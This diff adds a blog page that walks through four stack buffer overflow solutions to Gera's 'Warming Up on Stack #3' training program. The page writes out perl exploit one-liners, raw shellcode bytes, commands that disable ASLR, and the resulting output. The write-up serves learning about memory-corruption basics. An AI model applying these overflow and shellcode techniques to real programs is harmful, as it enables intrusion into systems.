@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>7h3rAm's Infosec Ramblings</title>
+    <meta charset="utf-8"/>
+    <meta content="7h3rAm" name="author"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+
+    <script src="/static/js/jquery/jquery-1.10.2.js"></script>
+    <link href="/static/css/bootstrap/bootstrap.3.3.6.min.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/morrisjs/morris.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/timeline/timeline.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/main.css" rel="stylesheet" type="text/css">
+    <link href="/static/css/codehilite/zenburn.css" rel="stylesheet" type="text/css">
+    <link href="/static/images/favicon.ico" rel="icon" type="image/x-icon"/>
+
+    <!-- Google Analytics -->
+    <script>
+    window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+    ga('create', 'UA-50288765-1', '7h3rAm.github.io');
+    ga('send', 'pageview');
+    </script>
+    <script async src='http://www.google-analytics.com/analytics.js'></script>
+    <!-- End Google Analytics -->
+
+  </head>
+  <body id="index" class="home">
+    <header class="header">
+      <nav>
+        <ul>
+          <li><a href="/"><i class="fa fa-home"></i> Home</a></li>
+          <li><a href="/archive.html"><i class="fa fa-archive"></i> Archive</a></li>
+          <li><a href="/tags.html"><i class="fa fa-tags"></i> Tags</a></li>
+          <li><a href="/dashboard.html"><i class="fa fa-bar-chart"></i> Dashboard</a></li>
+          <li><a href="/research.html"><i class="fa fa-list-alt"></i> Research</a></li>
+        </ul>
+      </nav>
+    </header>
+    <section id="content" class="body">
+      
+  
+  
+  <article class="post">
+  <div class="row">
+    <div class="col-lg-12">
+      <div class="panel panel-default">
+        <div class="panel-heading post-title">
+          Gera's Warming Up on Stack #3 - Solutions
+        </div>
+        <div class="panel-body">
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+              
+                
+                
+              
+              
+                
+                
+              
+              
+                <p class="post-date">
+                  <a href="/2013/geras-wuos-stack2-solutions.html"><i class="fa fa-angle-double-left"></i></a> published on January 3, 2013<a href="/2013/geras-wuos-stack4-solutions.html"> <i class="fa fa-angle-double-right"></i></a><br/>
+                  readtime: 10 minutes and 33 seconds (view <a href="https://raw.githubusercontent.io/7h3rAm/7h3rAm.github.io/master/_posts/geras-wuos-stack3-solutions.md">source</a>)
+                </p>
+              
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+        <div class="post-summary">Solutions for Gera's Warming up on Stack #3 program.</div>
+        <div class="post-content">
+          <p>Following is the part 3 in the series of posts I started back in August
+2012 with an aim to provide an analysis and possible solutions for the
+vulnerable programs provided by
+<a href="http://corelabs.coresecurity.com/index.php?module=Wiki&amp;action=view&amp;type=researcher&amp;name=Gerardo_Richarte">Gera</a>
+at his <a href="http://community.corest.com/%7Egera/InsecureProgramming/">Insecure
+Programming</a>
+by example page.</p>
+
+<p>This post follows the <a href="/2013/1/2/geras-wuos-stack2-solutions/">Gera&#8217;s Warming Up on Stack #2 -
+Solutions</a> post and if you have
+not read it, I request you to please do so. Most of the concepts are
+very similar and since they have been already talked about, I&#8217;ll not be
+reiterating them here.</p>
+
+<p>Let&#8217;s get started. Below is the source for the vulnerable
+<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>
+program:</p>
+
+<div class="codehilite"><pre><code><span class="cm">/* stack3.c                                     *</span>
+<span class="cm"> * specially crafted to feed your brain by gera */</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">cookie</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf: %08x cookie: %08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cookie</span><span class="p">);</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span> <span class="o">==</span> <span class="mh">0x01020005</span><span class="p">)</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;you win!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>The above program accepts user-input through the <code>gets</code> function and
+then looks for a specific value in a local variable named <code>cookie</code>. If
+this value is equal to a certain pre-defined constant, <code>printf</code> function
+is used to show a <code>you win!</code> message to the user. There is no direct
+means of modifying the content of the <code>cookie</code> variable. The <code>gets</code>
+function will keep reading from the stdin device until it encounters a
+newline or EoF character. Since this reading loop fails to honor the
+size of the destination buffer, a classic buffer overflow vulnerability
+is introduced in the program. Our aim is to leverage this vulnerability
+and exploit this program so that it print the <code>you win!</code> message to
+stdout.</p>
+
+<p>Here are a few observations that could be made by looking at the source
+of the program:</p>
+
+<ol>
+<li>Since it is defined prior to <code>buf</code>, the <code>cookie</code> would be placed at
+a higher memory address on the program stack, just below the saved
+registers from the function prologue</li>
+<li>The <code>buf</code> character array would be at an offset of at least 80B from
+<code>cookie</code></li>
+<li>The <code>gets</code> call would accept unbounded user-input within <code>buf</code> array
+and hence it provides a mechanism to alter the call stack contents</li>
+</ol>
+
+<p>Stack layout for
+<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>
+is identical to
+<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a>
+as already outlined in the <a href="/2012/8/27/geras-wuos-stack1-solutions/">Gera&#8217;s Warming Up on Stack #1 -
+Solutions</a> post.</p>
+
+<p>Here are solutions I could think of to get the <code>you win!</code> message
+printed:</p>
+
+<ul>
+<li>Solution #1: Overflow the internal <code>buf</code> array to overwrite
+<code>cookie</code> with 0x01020005</li>
+<li>Solution #2: Overflow the internal <code>buf</code> array to overwrite EIP
+with the address of <code>printf(you win!)</code></li>
+<li>Solution #3: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode and
+overwrite EIP with its address</li>
+<li>Solution #4: Inject a NOP-prefixed <code>printf(you win!)</code> shellcode
+through an environment var and overwrite EIP with its address</li>
+</ul>
+
+<p>Here&#8217;s a brief description of the test system:</p>
+
+<div class="codehilite"><pre><code><span class="c"># cat /etc/lsb-release | grep DESC ; uname -a | cut -d&#39; &#39; -f1,3,12-13 ; gcc --version | grep gcc ; cat /proc/cpuinfo | grep -E &#39;(vendor|model|flags)&#39;</span>
+<span class="nv">DISTRIB_DESCRIPTION</span><span class="o">=</span>*Ubuntu 10.04.2 LTS*
+Linux 2.6.38 i686 GNU/Linux
+gcc <span class="o">(</span>Ubuntu 4.4.3-4ubuntu5<span class="o">)</span> 4.4.3
+vendor_id   : GenuineIntel
+model       : 37
+model name  : Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i3 CPU       M <span class="m">350</span>  @ 2.27GHz
+flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc up pni monitor ssse3 lahf_l
+</code></pre></div>
+
+<h2>Solution #1: Overflow the internal buf array to overwrite cookie with 0x01020005</h2>
+
+<p>Here&#8217;s the GCC commandline to prepare
+<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>
+for this solution:</p>
+
+<div class="codehilite"><pre><code><span class="c"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack3 stack3.c</span>
+stack3.c: In <span class="k">function</span> ‘main’:
+stack3.c:8: warning: incompatible implicit declaration of built-in <span class="k">function</span> ‘printf’
+stack3.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">2</span> has <span class="nb">type</span> ‘char <span class="o">(</span>*<span class="o">)[</span>80<span class="o">]</span>’
+stack3.c:8: warning: format ‘%08x’ expects <span class="nb">type</span> ‘unsigned int’, but argument <span class="m">3</span> has <span class="nb">type</span> ‘int *’
+/tmp/ccuoj5F5.o: In <span class="k">function</span> <span class="sb">`</span>main<span class="s1">&#39;:</span>
+<span class="s1">stack3.c:(.text+0x27): warning: the `gets&#39;</span> <span class="k">function</span> is dangerous and should not be used.
+</code></pre></div>
+
+<p>All done, let&#8217;s exploit
+<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>:</p>
+
+<div class="codehilite"><pre><code><span class="c"># perl -e &#39;print &quot;A&quot;x80 . &quot;\x05\x00\x02\x01&quot;&#39; | ./stack3</span>
+buf: bfd625a4 cookie: bfd625f4
+you win!
+</code></pre></div>
+
+<h2>Solution #2: Overflow the internal buf array to overwrite EIP with the address of printf(you win!)</h2>
+
+<p>We need to have a look at the assembly of
+<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>
+and find out the location of the <code>printf</code> function which displays the
+<code>you win!</code> message:</p>
+
+<div class="codehilite"><pre><code><span class="c"># objdump -d -M intel stack3 | grep -A20 main.:</span>
+<span class="m">08048444</span> &lt;main&gt;:
+ 8048444:   <span class="m">55</span>                      push   ebp
+ 8048445:   <span class="m">89</span> e5                   mov    ebp,esp
+ 8048447:   <span class="m">83</span> ec <span class="m">60</span>                sub    esp,0x60
+ 804844a:   8d <span class="m">45</span> <span class="nb">fc                </span>lea    eax,<span class="o">[</span>ebp-0x4<span class="o">]</span>
+ 804844d:   <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">08</span>             mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,eax
+ 8048451:   8d <span class="m">45</span> ac                lea    eax,<span class="o">[</span>ebp-0x54<span class="o">]</span>
+ 8048454:   <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
+ 8048458:   c7 <span class="m">04</span> <span class="m">24</span> <span class="m">50</span> <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048550
+ 804845f:   e8 0c ff ff ff          call   <span class="m">8048370</span> &lt;<span class="nb">printf</span>@plt&gt;
+ 8048464:   8d <span class="m">45</span> ac                lea    eax,<span class="o">[</span>ebp-0x54<span class="o">]</span>
+ 8048467:   <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+ 804846a:   e8 e1 fe ff ff          call   <span class="m">8048350</span> &lt;gets@plt&gt;
+ 804846f:   8b <span class="m">45</span> <span class="nb">fc                </span>mov    eax,DWORD PTR <span class="o">[</span>ebp-0x4<span class="o">]</span>
+ 8048472:   3d <span class="m">05</span> <span class="m">00</span> <span class="m">02</span> <span class="m">01</span>          cmp    eax,0x1020005
+ 8048477:   <span class="m">75</span> 0c                   jne    <span class="m">8048485</span> &lt;main+0x41&gt;
+ 8048479:   c7 <span class="m">04</span> <span class="m">24</span> <span class="m">68</span> <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048568
+ 8048480:   e8 fb fe ff ff          call   <span class="m">8048380</span> &lt;puts@plt&gt;
+ 8048485:   c9                      leave
+ 8048486:   c3                      ret
+ 8048487:   <span class="m">90</span>                      nop
+</code></pre></div>
+
+<p>The address turns out to be 0x8048479. Let&#8217;s try exploiting:</p>
+
+<div class="codehilite"><pre><code><span class="c"># perl -e &#39;print &quot;A&quot;x88 . &quot;\x79\x84\x04\x08&quot;&#39; | ./stack3</span>
+buf: bfb82e64 cookie: bfb82eb4
+you win!
+Segmentation fault
+</code></pre></div>
+
+<h2>Solution #3: Inject a NOP-prefixed printf(you win!) shellcode and overwrite EIP with its address</h2>
+
+<p>Let&#8217;s first recompile
+<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>
+and request GCC to mark program stack as executable. Additionally, we
+also need to turn ASLR off so that we can have a static return address
+to overwrite EIP with:</p>
+
+<div class="codehilite"><pre><code><span class="c"># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o stack3 stack3.c 2&gt;/dev/null ; readelf -l stack3 | grep GNU_STACK</span>
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
+<span class="c">#</span>
+<span class="c"># echo 0 &gt;/proc/sys/kernel/randomize_va_space ; cat /proc/sys/kernel/randomize_va_space</span>
+0
+</code></pre></div>
+
+<p>Now lets go ahead with exploitation. The Null-free, NOP-prefixed
+<code>printf(you win!)</code> shellcode we used to exploit
+<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a>
+in the <a href="/2012/8/27/geras-wuos-stack1-solutions/">Gera&#8217;s Warming Up on Stack #1 -
+Solutions</a> post could be reused
+here:</p>
+
+<div class="codehilite"><pre><code><span class="c"># ./stack3</span>
+buf: bffff4c4 cookie: bffff514
+<span class="c">#</span>
+<span class="c"># ./stack3</span>
+buf: bffff4c4 cookie: bffff514
+<span class="c">#</span>
+<span class="c"># perl -e &#39;print &quot;\x90&quot;x51 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21&quot; . &quot;\xc4\xf4\xff\xbf&quot;&#39; | ./stack3</span>
+buf: bffff4c4 cookie: bffff514
+you win!#
+</code></pre></div>
+
+<h2>Solution #4: Inject a NOP-prefixed printf(you win!) shellcode through an environment var overwrite EIP with its address</h2>
+
+<p>Lets get straight to exploitation:</p>
+
+<div class="codehilite"><pre><code><span class="c"># echo $WINCODE | hexdump -C</span>
+<span class="m">00000000</span>  eb <span class="m">16</span> <span class="m">31</span> c0 <span class="m">31</span> db <span class="m">31</span> d2  b0 <span class="m">04</span> b3 <span class="m">01</span> <span class="m">59</span> b2 <span class="m">20</span> <span class="nb">cd</span>  <span class="p">|</span>..1.1.1.....Y. .<span class="p">|</span>
+<span class="m">00000010</span>  <span class="m">80</span> <span class="m">31</span> c0 <span class="m">40</span> <span class="m">31</span> db <span class="nb">cd </span><span class="m">80</span>  e8 e5 ff ff ff <span class="m">79</span> 6f <span class="m">75</span>  <span class="p">|</span>.1.@1........you<span class="p">|</span>
+<span class="m">00000020</span>  <span class="m">20</span> <span class="m">77</span> <span class="m">69</span> 6e <span class="m">21</span> <span class="m">20</span> 0d 0a                           <span class="p">|</span> win! ..<span class="p">|</span>
+00000028
+<span class="c">#</span>
+<span class="c"># ./getenvaddr WINCODE ./stack3</span>
+<span class="o">[</span>+<span class="o">]</span> WINCODE: 0xbffff726
+<span class="c">#</span>
+<span class="c"># perl -e &#39;print &quot;\x90&quot;x88 . &quot;\x26\xf7\xff\xbf&quot;&#39; | ./stack3</span>
+buf: bffff4c4 cookie: bffff514
+you win!
+</code></pre></div>
+
+<p>So, we have now successfully exploited the
+<a href="http://community.corest.com/%7Egera/InsecureProgramming/stack3.html">stack3.c</a>
+program through four different techniques. Depending on the motive of
+your exploitation attempt, other techniques could be devised and some,
+mentioned here, be rejected.</p>
+
+<p>Like I said, earlier, these solutions are not practical anymore. They
+just serve the purpose of understanding how exploits used to work before
+mitigation features were introduced in modern systems. But, as with
+everything else, understanding basics is really important. As mitigation
+features mature, exploitation techniques become increasingly complex.
+And to understand those, we need to build upon the solid foundation of
+basic concepts, like those discussed on this and other blogs.</p>
+
+        </div>
+        <div class="post-bottomline">
+          <hr/>
+          <p>For comments, questions and suggestions use <a href="https://twitter.com/7h3rAm" target="_blank"><i class="fa fa-twitter"></i></a> or create an <a href="https://github.com/7h3rAm/7h3rAm.github.io/issues/new" target="_blank"><i class="fa fa-exclamation-circle"></i> issue</a> on blog reporsitory.</p>
+          <hr/>
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+              
+                
+                
+              
+              
+                
+                
+              
+              <table>
+                <tr>
+                  <td align="left">(share via <a href="mailto:?subject=Gera's Warming Up on Stack #3 - Solutions&body=/2013/geras-wuos-stack3-solutions.html" target="_blank" title="Share via Email"><i class="fa fa-inbox"></i></a> <a href="http://twitter.com/intent/tweet?text=Gera's Warming Up on Stack #3 - Solutions+/2013/geras-wuos-stack3-solutions.html&via=7h3rAm" target="_blank" title="Share on Twitter"><i class="fa fa-twitter"></i></a> <a href="http://www.facebook.com/sharer/sharer.php?s=100&p[url]=/2013/geras-wuos-stack3-solutions.html&p[images][0]=&p[title]=Gera's Warming Up on Stack #3 - Solutions&p[summary]=Solutions for Gera's Warming up on Stack #3 program." target="_blank" title="Share on Facebook"><i class="fa fa-facebook"></i></a> <a href="https://plus.google.com/share?url=/2013/geras-wuos-stack3-solutions.html" target="_blank" title="Share on Google Plus"><i class="fa fa-google-plus"></i></a>)</td>
+                  <td align="right">(tagged <a href=/tags.html#exploit>exploit</a>, <a href=/tags.html#mitigations>mitigations</a>, <a href=/tags.html#buffer_overflow>buffer_overflow</a> and <a href=/tags.html#writeups>writeups</a>)</td>
+                </tr>
+                <tr>
+                  
+                    <td align="left"><a href="/2013/geras-wuos-stack2-solutions.html"><i class="fa fa-angle-double-left"></i> Gera's Warming Up on Stack #2 - Solutions <i class="fa fa-angle-double-left"></i></a></td>
+                    <td align="right"><a href="/2013/geras-wuos-stack4-solutions.html"><i class="fa fa-angle-double-right"></i> Gera's Warming Up on Stack #4 - Solutions <i class="fa fa-angle-double-right"></i></a></td>
+                  
+                </tr>
+              </table>
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="row">
+    <div class="col-lg-12">
+      <div class="panel panel-default">
+        <div class="panel-heading post-title">
+          Related Posts
+        </div>
+        <div class="panel-body">
+          
+            1. <a href="/2014/buf0-challenge.html">buf0 - A Buffer Overflow Challenge</a>
+            <div class="overview-date">January 6, 2014</div>
+            <br/>
+          
+            2. <a href="/2012/exploit-mitigation-techniques-on-linux.html">Exploit Mitigation Techniques on Linux Systems</a>
+            <div class="overview-date">July 10, 2012</div>
+            <br/>
+          
+            3. <a href="/2012/shadow-stream-recorder-asx-jmpesp.html">Shadow Stream Recorder .asx File Parsing Buffer Overflow</a>
+            <div class="overview-date">September 2, 2012</div>
+            <br/>
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  </article>
+
+    </section>
+    <footer class="footer">
+      <b><a href="/">Ankur Tyagi</a></b> (<b><a href="https://twitter.com/7h3rAm" target="_blank"><i class="fa fa-at"></i>7h3rAm</a></b>)
+      <br/>
+      Last updated on October 20, 2016 (<b><a href="/rss.xml"><i class="fa fa-rss"></i> rss</a></b> <b><a href="/sitemap.xml"><i class="fa fa-sitemap"></i> sitemap</a></b>)
+      <br/>
+      Published under <b><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank">by-nc-sa</a></b> and powered by <b><a alt="Linux" href="https://www.kernel.org/" target="_blank"><i class="fa fa-linux"></i></a></b>, <b><a alt="Kalpi" href="https://github.com/7h3rAm/kalpi/" target="_blank">kalpi</a></b>, <b><a href="http://git-scm.com/" target="_blank"><i class="fa fa-git"></i></a></b> and <b><a href="https://github.com/7h3rAm/7h3ram.github.io" target="_blank"><i class="fa fa-github"></i></a></b>
+    </footer>
+
+    <script src="/static/js/bootstrap/bootstrap.3.3.6.min.js"></script>
+    <script src="/static/js/raphael/raphael-min.js"></script>
+    <script src="/static/js/morrisjs/morris.min.js"></script>
+    <script src="/static/files/chart-data.js"></script>
+    <script src="/static/js/sprintf/sprintf.js"></script>
+    <script src="/static/js/underscore/underscore-min.js"></script>
+
+  </body>
+</html>
